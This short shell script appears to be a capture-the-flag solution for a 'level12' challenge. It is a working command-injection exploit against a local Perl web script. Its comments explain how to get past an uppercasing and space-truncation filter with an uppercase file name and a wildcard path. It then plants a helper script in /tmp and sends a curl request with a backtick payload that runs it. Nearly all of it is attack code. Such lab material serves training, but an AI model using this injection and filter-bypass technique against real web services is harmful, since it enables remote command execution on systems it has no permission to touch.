#!/bin/sh

# The level12.pl file uses magic quotes
# 	-> there lies the exploit
#
# The two lines before these magic quotes :
# 	- uppercase everything
#	- erases any character trailling a space
#
# To mitigate these bariers we use an uppercased
# file name and wildcards to access it
# (/TMP/ not beeing a thing)

echo '#!/bin/sh' > /tmp/WOW
echo 'getflag > /tmp/flag' >> /tmp/WOW
chmod 754 /tmp/WOW
curl 'http://localhost:4646/?x=`/*/WOW`'
cat /tmp/flag

